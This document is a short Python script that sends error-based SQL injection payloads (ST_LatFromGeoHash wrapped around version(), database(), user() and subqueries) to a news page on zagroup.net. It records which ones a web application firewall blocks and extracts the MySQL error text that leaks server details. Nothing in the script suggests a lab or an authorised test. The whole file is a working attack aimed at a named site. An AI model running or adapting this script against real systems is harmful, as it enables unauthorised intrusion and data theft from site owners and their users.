#!/usr/bin/env python3
"""zagroup: find WAF boundary for ST_LatFromGeoHash payloads"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def test(payload, tag):
    u = BASE + "?c=259" + payload
    try:
        req = urllib.request.Request(u, headers=UA)
        r = urllib.request.urlopen(req, timeout=10)
        body = r.read().decode("utf-8", "ignore")
        code = r.status
    except urllib.error.HTTPError as e:
        body = e.read(3000).decode("utf-8", "ignore")
        code = e.code
    except Exception:
        body, code = "", 0
    waf = code == 403
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    print("%-45s code=%s waf=%s %s" % (tag, code, waf, m.group(1)[:90] if m else ""))

# WAF boundary tests
test("%27%20and%20ST_LatFromGeoHash(version())--%20", "ST(version())")
test("%27%20and%20ST_LatFromGeoHash(database())--%20", "ST(database())")
test("%27%20and%20ST_LatFromGeoHash(user())--%20", "ST(user())")
test("%27%20and%20ST_LatFromGeoHash(concat(1,2))--%20", "ST(concat)")
test("%27%20and%20ST_LatFromGeoHash(concat(0x7e,1))--%20", "ST(0x7e)")
test("%27%20and%20ST_LatFromGeoHash(concat(char(126),version()))--%20", "ST(char)")
test("%27%20and%20ST_LatFromGeoHash(concat(0x7e,database()))--%20", "ST(0x7e,db)")
test("%27%20and%20ST_LatFromGeoHash((select%201))--%20", "ST(subq)")
